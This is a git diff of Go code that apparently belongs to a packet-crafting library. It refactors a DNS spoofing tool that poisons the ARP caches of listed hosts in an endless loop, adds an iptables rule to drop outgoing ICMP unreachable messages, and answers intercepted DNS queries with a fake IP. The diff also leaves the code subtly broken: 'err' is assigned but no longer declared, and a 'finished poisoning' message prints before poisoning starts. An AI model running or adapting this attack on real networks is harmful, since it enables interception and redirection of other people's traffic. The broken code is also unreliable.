@@ -5,7 +5,7 @@ import (
 	"fmt"
 	"github.com/google/gopacket/layers"
 	craft "github.com/tiagomdiogo/ScaGo/packet"
-	"github.com/tiagomdiogo/ScaGo/supersocket"
+	communication "github.com/tiagomdiogo/ScaGo/supersocket"
 	"github.com/tiagomdiogo/ScaGo/utils"
 	"log"
 	"net"
@@ -21,6 +21,7 @@ func parseHosts(hosts string, mapList map[string]string, iface string) {
 	}
 	defer file.Close()
 
+	fmt.Println("Scanning hosts for MAC addresses...")
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := scanner.Text()
@@ -37,17 +38,18 @@ func parseHosts(hosts string, mapList map[string]string, iface string) {
 	return
 
 }
-func PoisonArp(mapList map[string]string, iface string, SuperS *supersocket.SuperSocket) {
+func PoisonArp(mapList map[string]string, iface string) {
 
 	macInt := utils.MacByInt(iface)
+	fmt.Println("Finished poisoning ARP Caches...")
 	for {
 		for addr1, mac1 := range mapList {
 			for addr2, mac2 := range mapList {
 				if addr1 != addr2 {
 					fmt.Printf("Spoofing ARP cache: targetIP=%s, targetMac=%s, sourceIP=%s\n", addr1, mac1, addr2)
 					packet1, packet2 := CreateFakeArp(addr1, addr2, mac1, mac2, macInt)
-					SuperS.Send(packet1)
-					SuperS.Send(packet2)
+					communication.Send(packet1, iface)
+					communication.Send(packet2, iface)
 				}
 			}
 		}
@@ -58,24 +60,19 @@ func PoisonArp(mapList map[string]string, iface string, SuperS *supersocket.Supe
 
 func DNSSpoofing(iface, hosts, fakeIP string) {
 
-	SuperS, err := supersocket.NewSuperSocket(iface, "")
 	ipMap := make(map[string]string)
 	cmd := exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP")
 	err = cmd.Run()
 	if err != nil {
 		log.Fatal(err)
 	}
-	parseHosts(hosts, ipMap, iface)
-	fmt.Println("All the MAC obtained")
 
-	fmt.Println("Poisoning the ARP cache of hosts")
-	go PoisonArp(ipMap, iface, SuperS)
+	parseHosts(hosts, ipMap, iface)
+
+	go PoisonArp(ipMap, iface)
 
 	for {
-		packet, err := SuperS.Recv()
-		if err != nil {
-			log.Fatal(err)
-		}
+		packet := communication.Recv(iface)
 
 		dns := packet.Layer(layers.LayerTypeDNS)
 		if dns == nil {
@@ -114,12 +111,9 @@ func DNSSpoofing(iface, hosts, fakeIP string) {
 			dnsToSend.AddAnswer(string(dnsLayer.Questions[0].Name), fakeIP)
 			dnsToSend.Layer().Questions = dnsLayer.Questions
 
-			packetCrafted, err := craft.CraftPacket(ethToSend.Layer(), ipToSend.Layer(), udpToSend.Layer(), dnsToSend.Layer())
-
-			if err != nil {
-				log.Fatal(err)
-			}
-			SuperS.Send(packetCrafted)
+			packetCrafted, _ := craft.CraftPacket(ethToSend.Layer(), ipToSend.Layer(), udpToSend.Layer(), dnsToSend.Layer())
+			fmt.Printf("Sending DNS record to host at %s\n", ipLayer.DstIP.String())
+			communication.Send(packetCrafted, iface)
 
 		}
 	}
